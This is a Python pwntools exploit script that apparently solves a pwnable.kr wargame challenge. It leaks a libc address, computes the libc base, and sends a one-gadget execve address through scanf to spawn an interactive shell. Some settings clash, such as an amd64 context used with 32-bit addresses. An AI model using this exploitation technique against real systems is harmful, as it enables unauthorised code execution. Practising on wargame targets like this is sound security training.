from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"
context.log_level="debug"

binary_name = "exploitable"
libc_name = "libc32_pwnable.so"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)
REMOTE = "nc pwnable.kr 9018"

context.binary = e

def scanfInput(target_addr):
    if(target_addr> 2147483648):
        # int is a signed type
        target_addr-=2**32
    system_num = str(target_addr).encode() # scanf expects a number like b"342"
    return system_num


def main():
    if(len(sys.argv) <2):
        print("Running locally")
        libc = e.libc
        p = process(f"./{binary_name}")
    else:
        if(sys.argv[1] == "remote"):
            libc= ELF(libc_name)
            ip, port = REMOTE.replace("nc ", "").split(" ")
            port = int(port)
            p = remote(ip, port)

        elif(sys.argv[1] == "gdb"):
            libc = e.libc
            p = gdb.debug(f"./{binary_name}", gdbscript="b *0x08048567", aslr=True)
        else:
            libc = e.libc
            p = process(f"./{binary_name}")

    stdout = u32(p.recv(4))
    libc.address=stdout-libc.sym['stdout'] + 0x9c

    system_addr = libc.sym['execle']

    log.success(f'LIBC base: {hex(libc.address)}')
    log.success(f"system is at {hex(system_addr)}")

    one_gadget_offset=scanfInput(0xb0b3c + libc.address)

  #  b0b3c:       lea    eax,[esp+0x18]

  #  b0b40:       push   eax
  #  b0b41:       push   DWORD PTR [esp+0x103c]
  #  b0b48:       call   b08c0 <execve@@GLIBC_2.0>

# execve("<\033\341\367",&"/Hacker_Secret/exploitable")


    p.sendline(one_gadget_offset)

    p.interactive()
main()

